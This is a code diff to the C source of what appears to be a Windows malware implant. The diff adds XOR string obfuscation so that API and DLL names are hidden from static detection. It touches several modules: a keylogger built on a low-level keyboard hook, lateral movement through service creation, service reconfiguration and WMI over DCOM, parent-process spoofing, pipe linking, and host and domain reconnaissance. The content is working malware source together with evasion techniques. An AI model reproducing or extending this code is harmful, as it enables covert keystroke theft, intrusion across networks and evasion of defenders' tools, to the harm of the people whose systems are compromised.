@@ -804,8 +804,10 @@ static DWORD WINAPI _kl_thread_func(LPVOID param) {
     _kl_hook = fnSetHook(13 /*WH_KEYBOARD_LL*/, _kl_hook_proc, NULL, 0);
     if (!_kl_hook) {
         /* Retry with exe module handle */
-        HMODULE hK32 = LoadLibraryA("kernel32.dll");
-        _kl_fn_GetModHandle fnGMH = (_kl_fn_GetModHandle)GetProcAddress(hK32, "GetModuleHandleA");
+        char _tk[] = S_KERNEL32_DLL; _DEOBF(_tk);
+        char _tg[] = S_GetModuleHandleA_S; _DEOBF(_tg);
+        HMODULE hK32 = LoadLibraryA(_tk);
+        _kl_fn_GetModHandle fnGMH = (_kl_fn_GetModHandle)GetProcAddress(hK32, _tg);
         HMODULE hSelf = fnGMH ? fnGMH(NULL) : NULL;
         if (hSelf)
             _kl_hook = fnSetHook(13, _kl_hook_proc, hSelf, 0);
@@ -817,15 +819,18 @@ static DWORD WINAPI _kl_thread_func(LPVOID param) {
     }
 
     /* Message pump — required for low-level hooks */
-    HMODULE hU32 = LoadLibraryA("user32.dll");
-    _kl_fn_GetMsg fnGetMsg = (_kl_fn_GetMsg)GetProcAddress(hU32, "GetMessageA");
+    char _tu[] = S_USER32_DLL; _DEOBF(_tu);
+    char _tm[] = S_GetMessageA; _DEOBF(_tm);
+    HMODULE hU32 = LoadLibraryA(_tu);
+    _kl_fn_GetMsg fnGetMsg = (_kl_fn_GetMsg)GetProcAddress(hU32, _tm);
 
     MSG msg;
     while (fnGetMsg(&msg, NULL, 0, 0) > 0) {
         /* WM_QUIT → GetMessage returns 0 → loop exits */
     }
 
-    _kl_fn_Unhook fnUnhook = (_kl_fn_Unhook)GetProcAddress(hU32, "UnhookWindowsHookEx");
+    char _tuh[] = S_UnhookWindowsHookEx; _DEOBF(_tuh);
+    _kl_fn_Unhook fnUnhook = (_kl_fn_Unhook)GetProcAddress(hU32, _tuh);
     if (fnUnhook && _kl_hook) { fnUnhook(_kl_hook); _kl_hook = NULL; }
 
     return 0;
@@ -856,18 +861,24 @@ void mod_keylogger(Buffer *out, const char *subcmd) {
         LeaveCriticalSection(&_kl_cs);
 
         /* Resolve user32 functions */
-        HMODULE hU32 = LoadLibraryA("user32.dll");
+        char _su[] = S_USER32_DLL; _DEOBF(_su);
+        HMODULE hU32 = LoadLibraryA(_su);
         if (!hU32) {
             InterlockedExchange(&_kl_active, 0);
             buf_append(out, "Failed to load user32.dll", 25);
             return;
         }
 
-        _kl_fn_SetHook fnSetHook = (_kl_fn_SetHook)GetProcAddress(hU32, "SetWindowsHookExA");
-        _klCallNext  = (_kl_fn_CallNext)   GetProcAddress(hU32, "CallNextHookEx");
-        _klGetFgWnd  = (_kl_fn_GetFgWnd)   GetProcAddress(hU32, "GetForegroundWindow");
-        _klGetWndTxt = (_kl_fn_GetWndTxt)  GetProcAddress(hU32, "GetWindowTextA");
-        _klGetKS     = (_kl_fn_GetKeyState) GetProcAddress(hU32, "GetKeyState");
+        char _a1[] = S_SetWindowsHookExA; _DEOBF(_a1);
+        char _a2[] = S_CallNextHookEx; _DEOBF(_a2);
+        char _a3[] = S_GetForegroundWindow; _DEOBF(_a3);
+        char _a4[] = S_GetWindowTextA; _DEOBF(_a4);
+        char _a5[] = S_GetKeyState; _DEOBF(_a5);
+        _kl_fn_SetHook fnSetHook = (_kl_fn_SetHook)GetProcAddress(hU32, _a1);
+        _klCallNext  = (_kl_fn_CallNext)   GetProcAddress(hU32, _a2);
+        _klGetFgWnd  = (_kl_fn_GetFgWnd)   GetProcAddress(hU32, _a3);
+        _klGetWndTxt = (_kl_fn_GetWndTxt)  GetProcAddress(hU32, _a4);
+        _klGetKS     = (_kl_fn_GetKeyState) GetProcAddress(hU32, _a5);
 
         if (!fnSetHook || !_klCallNext || !_klGetFgWnd || !_klGetWndTxt || !_klGetKS) {
             InterlockedExchange(&_kl_active, 0);
@@ -902,8 +913,10 @@ void mod_keylogger(Buffer *out, const char *subcmd) {
         }
 
         /* Signal hook thread to exit via WM_QUIT */
-        HMODULE hU32 = LoadLibraryA("user32.dll");
-        _kl_fn_PostThrdMsg fnPost = (_kl_fn_PostThrdMsg)GetProcAddress(hU32, "PostThreadMessageA");
+        char _pu[] = S_USER32_DLL; _DEOBF(_pu);
+        char _pp[] = S_PostThreadMessageA; _DEOBF(_pp);
+        HMODULE hU32 = LoadLibraryA(_pu);
+        _kl_fn_PostThrdMsg fnPost = (_kl_fn_PostThrdMsg)GetProcAddress(hU32, _pp);
         if (fnPost && _kl_thread_id)
             fnPost(_kl_thread_id, 0x0012 /*WM_QUIT*/, 0, 0);
 
@@ -998,17 +1011,26 @@ static void _jump_randname(char *buf, int len) {
 
 static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
                          const unsigned char *payload, DWORD payload_len) {
-    HMODULE hAdv = LoadLibraryA("advapi32.dll");
-    HMODULE hK32 = LoadLibraryA("kernel32.dll");
+    char _da[] = S_ADVAPI32_DLL; _DEOBF(_da);
+    char _dk[] = S_KERNEL32_DLL; _DEOBF(_dk);
+    HMODULE hAdv = LoadLibraryA(_da);
+    HMODULE hK32 = LoadLibraryA(_dk);
     if (!hAdv || !hK32) { BUF_STR(out, "[-] Failed to load libs\n"); return FALSE; }
 
-    fn_OpenSCManagerW pOpenSCM = (fn_OpenSCManagerW)GetProcAddress(hAdv, "OpenSCManagerW");
-    fn_CreateServiceW pCreateSvc = (fn_CreateServiceW)GetProcAddress(hAdv, "CreateServiceW");
-    fn_StartServiceW pStartSvc = (fn_StartServiceW)GetProcAddress(hAdv, "StartServiceW");
-    fn_DeleteService pDeleteSvc = (fn_DeleteService)GetProcAddress(hAdv, "DeleteService");
-    fn_CloseServiceHandle pCloseSH = (fn_CloseServiceHandle)GetProcAddress(hAdv, "CloseServiceHandle");
-    fn_CopyFileW pCopyFile = (fn_CopyFileW)GetProcAddress(hK32, "CopyFileW");
-    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, "DeleteFileW");
+    char _p1[] = S_OpenSCManagerW; _DEOBF(_p1);
+    char _p2[] = S_CreateServiceW; _DEOBF(_p2);
+    char _p3[] = S_StartServiceW; _DEOBF(_p3);
+    char _p4[] = S_DeleteService_S; _DEOBF(_p4);
+    char _p5[] = S_CloseServiceHandle; _DEOBF(_p5);
+    char _p6[] = S_CopyFileW; _DEOBF(_p6);
+    char _p7[] = S_DeleteFileW; _DEOBF(_p7);
+    fn_OpenSCManagerW pOpenSCM = (fn_OpenSCManagerW)GetProcAddress(hAdv, _p1);
+    fn_CreateServiceW pCreateSvc = (fn_CreateServiceW)GetProcAddress(hAdv, _p2);
+    fn_StartServiceW pStartSvc = (fn_StartServiceW)GetProcAddress(hAdv, _p3);
+    fn_DeleteService pDeleteSvc = (fn_DeleteService)GetProcAddress(hAdv, _p4);
+    fn_CloseServiceHandle pCloseSH = (fn_CloseServiceHandle)GetProcAddress(hAdv, _p5);
+    fn_CopyFileW pCopyFile = (fn_CopyFileW)GetProcAddress(hK32, _p6);
+    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, _p7);
 
     if (!pOpenSCM || !pCreateSvc || !pStartSvc || !pDeleteSvc || !pCloseSH ||
         !pCopyFile || !pDeleteFile) {
@@ -1111,17 +1133,26 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
      */
     (void)payload; (void)payload_len;
 
-    HMODULE hAdv = LoadLibraryA("advapi32.dll");
-    HMODULE hK32 = LoadLibraryA("kernel32.dll");
+    char _sa[] = S_ADVAPI32_DLL; _DEOBF(_sa);
+    char _sk[] = S_KERNEL32_DLL; _DEOBF(_sk);
+    HMODULE hAdv = LoadLibraryA(_sa);
+    HMODULE hK32 = LoadLibraryA(_sk);
     if (!hAdv || !hK32) { BUF_STR(out, "[-] Failed to load libs\n"); return FALSE; }
 
-    fn_OpenSCManagerW pOpenSCM = (fn_OpenSCManagerW)GetProcAddress(hAdv, "OpenSCManagerW");
-    fn_OpenServiceW pOpenSvc = (fn_OpenServiceW)GetProcAddress(hAdv, "OpenServiceW");
-    fn_StartServiceW pStartSvc = (fn_StartServiceW)GetProcAddress(hAdv, "StartServiceW");
-    fn_ChangeServiceConfigW pChangeCfg = (fn_ChangeServiceConfigW)GetProcAddress(hAdv, "ChangeServiceConfigW");
-    fn_QueryServiceConfigW pQueryCfg = (fn_QueryServiceConfigW)GetProcAddress(hAdv, "QueryServiceConfigW");
-    fn_CloseServiceHandle pCloseSH = (fn_CloseServiceHandle)GetProcAddress(hAdv, "CloseServiceHandle");
-    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, "DeleteFileW");
+    char _q1[] = S_OpenSCManagerW; _DEOBF(_q1);
+    char _q2[] = S_OpenServiceW; _DEOBF(_q2);
+    char _q3[] = S_StartServiceW; _DEOBF(_q3);
+    char _q4[] = S_ChangeServiceConfigW; _DEOBF(_q4);
+    char _q5[] = S_QueryServiceConfigW; _DEOBF(_q5);
+    char _q6[] = S_CloseServiceHandle; _DEOBF(_q6);
+    char _q7[] = S_DeleteFileW; _DEOBF(_q7);
+    fn_OpenSCManagerW pOpenSCM = (fn_OpenSCManagerW)GetProcAddress(hAdv, _q1);
+    fn_OpenServiceW pOpenSvc = (fn_OpenServiceW)GetProcAddress(hAdv, _q2);
+    fn_StartServiceW pStartSvc = (fn_StartServiceW)GetProcAddress(hAdv, _q3);
+    fn_ChangeServiceConfigW pChangeCfg = (fn_ChangeServiceConfigW)GetProcAddress(hAdv, _q4);
+    fn_QueryServiceConfigW pQueryCfg = (fn_QueryServiceConfigW)GetProcAddress(hAdv, _q5);
+    fn_CloseServiceHandle pCloseSH = (fn_CloseServiceHandle)GetProcAddress(hAdv, _q6);
+    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, _q7);
 
     if (!pOpenSCM || !pOpenSvc || !pStartSvc || !pChangeCfg || !pQueryCfg || !pCloseSH) {
         BUF_STR(out, "[-] Failed to resolve SCM APIs\n");
@@ -1376,10 +1407,14 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
      * then execute via Win32_Process.Create over DCOM.
      * All COM functions resolved dynamically — no static imports. */
 
-    HMODULE hK32 = LoadLibraryA("kernel32.dll");
-    HMODULE hOle = LoadLibraryA("ole32.dll");
-    HMODULE hOleaut = LoadLibraryA("oleaut32.dll");
-    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, "DeleteFileW");
+    char _wk[] = S_KERNEL32_DLL; _DEOBF(_wk);
+    char _wo[] = S_OLE32_DLL; _DEOBF(_wo);
+    char _wa[] = S_OLEAUT32_DLL; _DEOBF(_wa);
+    HMODULE hK32 = LoadLibraryA(_wk);
+    HMODULE hOle = LoadLibraryA(_wo);
+    HMODULE hOleaut = LoadLibraryA(_wa);
+    char _wd[] = S_DeleteFileW; _DEOBF(_wd);
+    fn_DeleteFileW pDeleteFile = (fn_DeleteFileW)GetProcAddress(hK32, _wd);
 
     if (!hOle || !hOleaut) {
         BUF_STR(out, "[-] Failed to load COM libs\n");
@@ -1387,15 +1422,24 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
     }
 
     /* Resolve COM functions dynamically */
-    fn_CoInitializeEx pCoInitEx = (fn_CoInitializeEx)GetProcAddress(hOle, "CoInitializeEx");
-    fn_CoUninitialize_t pCoUninit = (fn_CoUninitialize_t)GetProcAddress(hOle, "CoUninitialize");
-    fn_CoInitializeSecurity_t pCoInitSec = (fn_CoInitializeSecurity_t)GetProcAddress(hOle, "CoInitializeSecurity");
-    fn_CoCreateInstance_t pCoCreate = (fn_CoCreateInstance_t)GetProcAddress(hOle, "CoCreateInstance");
-    fn_CoSetProxyBlanket_t pCoSetProxy = (fn_CoSetProxyBlanket_t)GetProcAddress(hOle, "CoSetProxyBlanket");
-    fn_SysAllocString_t pSysAlloc = (fn_SysAllocString_t)GetProcAddress(hOleaut, "SysAllocString");
-    fn_SysFreeString_t pSysFree = (fn_SysFreeString_t)GetProcAddress(hOleaut, "SysFreeString");
-    fn_VariantInit_t pVarInit = (fn_VariantInit_t)GetProcAddress(hOleaut, "VariantInit");
-    fn_VariantClear_t pVarClear = (fn_VariantClear_t)GetProcAddress(hOleaut, "VariantClear");
+    char _c1[] = S_CoInitializeEx; _DEOBF(_c1);
+    char _c2[] = S_CoUninitialize; _DEOBF(_c2);
+    char _c3[] = S_CoInitializeSecurity; _DEOBF(_c3);
+    char _c4[] = S_CoCreateInstance; _DEOBF(_c4);
+    char _c5[] = S_CoSetProxyBlanket; _DEOBF(_c5);
+    char _c6[] = S_SysAllocString; _DEOBF(_c6);
+    char _c7[] = S_SysFreeString; _DEOBF(_c7);
+    char _c8[] = S_VariantInit; _DEOBF(_c8);
+    char _c9[] = S_VariantClear; _DEOBF(_c9);
+    fn_CoInitializeEx pCoInitEx = (fn_CoInitializeEx)GetProcAddress(hOle, _c1);
+    fn_CoUninitialize_t pCoUninit = (fn_CoUninitialize_t)GetProcAddress(hOle, _c2);
+    fn_CoInitializeSecurity_t pCoInitSec = (fn_CoInitializeSecurity_t)GetProcAddress(hOle, _c3);
+    fn_CoCreateInstance_t pCoCreate = (fn_CoCreateInstance_t)GetProcAddress(hOle, _c4);
+    fn_CoSetProxyBlanket_t pCoSetProxy = (fn_CoSetProxyBlanket_t)GetProcAddress(hOle, _c5);
+    fn_SysAllocString_t pSysAlloc = (fn_SysAllocString_t)GetProcAddress(hOleaut, _c6);
+    fn_SysFreeString_t pSysFree = (fn_SysFreeString_t)GetProcAddress(hOleaut, _c7);
+    fn_VariantInit_t pVarInit = (fn_VariantInit_t)GetProcAddress(hOleaut, _c8);
+    fn_VariantClear_t pVarClear = (fn_VariantClear_t)GetProcAddress(hOleaut, _c9);
 
     if (!pCoInitEx || !pCoCreate || !pSysAlloc || !pSysFree || !pVarInit) {
         BUF_STR(out, "[-] Failed to resolve COM functions\n");
@@ -1886,8 +1930,10 @@ void mod_unlink(Buffer *out, const unsigned char *args, DWORD args_len) {
             if (_linked[i].hPipe != INVALID_HANDLE_VALUE) {
                 /* Use CancelIoEx to unblock pending ReadFile if available */
                 typedef BOOL (WINAPI *fnCancelIoEx)(HANDLE, LPOVERLAPPED);
-                HMODULE hK32 = LoadLibraryA("kernel32.dll");
-                fnCancelIoEx pCancelIoEx = (fnCancelIoEx)GetProcAddress(hK32, "CancelIoEx");
+                char _lk[] = S_KERNEL32_DLL; _DEOBF(_lk);
+                char _lc[] = S_CancelIoEx; _DEOBF(_lc);
+                HMODULE hK32 = LoadLibraryA(_lk);
+                fnCancelIoEx pCancelIoEx = (fnCancelIoEx)GetProcAddress(hK32, _lc);
                 if (pCancelIoEx)
                     pCancelIoEx(_linked[i].hPipe, NULL);
                 CloseHandle(_linked[i].hPipe);
@@ -2028,9 +2074,11 @@ void mod_ppid(Buffer *out, const char *argstr) {
         char procname[MAX_PATH] = {0};
         DWORD namesize = MAX_PATH;
         typedef BOOL (WINAPI *fnQueryFullProcessImageNameA)(HANDLE, DWORD, LPSTR, PDWORD);
-        HMODULE hK32 = LoadLibraryA("kernel32.dll");
+        char _qk[] = S_KERNEL32_DLL; _DEOBF(_qk);
+        char _qq[] = S_QueryFullProcessImageNameA; _DEOBF(_qq);
+        HMODULE hK32 = LoadLibraryA(_qk);
         fnQueryFullProcessImageNameA pQuery = (fnQueryFullProcessImageNameA)
-            GetProcAddress(hK32, "QueryFullProcessImageNameA");
+            GetProcAddress(hK32, _qq);
         if (pQuery && pQuery(hProc, 0, procname, &namesize)) {
             /* Extract just the filename */
             char *slash = strrchr(procname, '\\');
@@ -2426,10 +2474,12 @@ void mod_systeminfo(Buffer *out) {
             ULONG Family, ULONG Flags, PVOID Reserved,
             void *AdapterAddresses, PULONG SizePointer);
 
-        HMODULE hIp = LoadLibraryA("iphlpapi.dll");
+        char _ip[] = S_IPHLPAPI_DLL; _DEOBF(_ip);
+        char _ga[] = S_GetAdaptersAddresses; _DEOBF(_ga);
+        HMODULE hIp = LoadLibraryA(_ip);
         pGetAdaptersAddresses fnGAA = NULL;
         if (hIp)
-            fnGAA = (pGetAdaptersAddresses)GetProcAddress(hIp, "GetAdaptersAddresses");
+            fnGAA = (pGetAdaptersAddresses)GetProcAddress(hIp, _ga);
 
         if (fnGAA) {
             ULONG bufLen = 16384;
@@ -2479,12 +2529,17 @@ void mod_systeminfo(Buffer *out) {
             typedef void (WINAPI *pFreeAddrInfoA)(void *);
             typedef int (WINAPI *pWSACleanup)(void);
 
-            HMODULE hWs2 = LoadLibraryA("ws2_32.dll");
+            char _nw[] = S_WS2_32_DLL; _DEOBF(_nw);
+            HMODULE hWs2 = LoadLibraryA(_nw);
             if (hWs2) {
-                pWSAStartup  fnStart   = (pWSAStartup)GetProcAddress(hWs2, "WSAStartup");
-                pGetAddrInfoA fnGetAI  = (pGetAddrInfoA)GetProcAddress(hWs2, "getaddrinfo");
-                pFreeAddrInfoA fnFreeAI = (pFreeAddrInfoA)GetProcAddress(hWs2, "freeaddrinfo");
-                pWSACleanup  fnCleanup = (pWSACleanup)GetProcAddress(hWs2, "WSACleanup");
+                char _n1[] = {'W'^_XK,'S'^_XK,'A'^_XK,'S'^_XK,'t'^_XK,'a'^_XK,'r'^_XK,'t'^_XK,'u'^_XK,'p'^_XK,0}; _DEOBF(_n1);
+                char _n2[] = {'g'^_XK,'e'^_XK,'t'^_XK,'a'^_XK,'d'^_XK,'d'^_XK,'r'^_XK,'i'^_XK,'n'^_XK,'f'^_XK,'o'^_XK,0}; _DEOBF(_n2);
+                char _n3[] = {'f'^_XK,'r'^_XK,'e'^_XK,'e'^_XK,'a'^_XK,'d'^_XK,'d'^_XK,'r'^_XK,'i'^_XK,'n'^_XK,'f'^_XK,'o'^_XK,0}; _DEOBF(_n3);
+                char _n4[] = {'W'^_XK,'S'^_XK,'A'^_XK,'C'^_XK,'l'^_XK,'e'^_XK,'a'^_XK,'n'^_XK,'u'^_XK,'p'^_XK,0}; _DEOBF(_n4);
+                pWSAStartup  fnStart   = (pWSAStartup)GetProcAddress(hWs2, _n1);
+                pGetAddrInfoA fnGetAI  = (pGetAddrInfoA)GetProcAddress(hWs2, _n2);
+                pFreeAddrInfoA fnFreeAI = (pFreeAddrInfoA)GetProcAddress(hWs2, _n3);
+                pWSACleanup  fnCleanup = (pWSACleanup)GetProcAddress(hWs2, _n4);
 
                 if (fnStart && fnGetAI && fnFreeAI && fnCleanup) {
                     unsigned char wsaData[512];
@@ -2596,13 +2651,16 @@ void mod_systeminfo(Buffer *out) {
             const wchar_t *, DWORD, void **);
         typedef void (WINAPI *pDsRoleFreeMemory)(void *);
 
-        HMODULE hDs = LoadLibraryA("dsrole.dll");
+        char _nd[] = S_DSROLE_DLL; _DEOBF(_nd);
+        HMODULE hDs = LoadLibraryA(_nd);
         BOOL domain_printed = FALSE;
         if (hDs) {
+            char _ng[] = S_DsRoleGetPrimaryDomainInformation; _DEOBF(_ng);
+            char _nf[] = S_DsRoleFreeMemory; _DEOBF(_nf);
             pDsRoleGetPrimaryDomainInformation fnGet =
-                (pDsRoleGetPrimaryDomainInformation)GetProcAddress(hDs, "DsRoleGetPrimaryDomainInformation");
+                (pDsRoleGetPrimaryDomainInformation)GetProcAddress(hDs, _ng);
             pDsRoleFreeMemory fnFree =
-                (pDsRoleFreeMemory)GetProcAddress(hDs, "DsRoleFreeMemory");
+                (pDsRoleFreeMemory)GetProcAddress(hDs, _nf);
 
             if (fnGet && fnFree) {
                 /* DSROLE_PRIMARY_DOMAIN_INFO_BASIC = 1 */
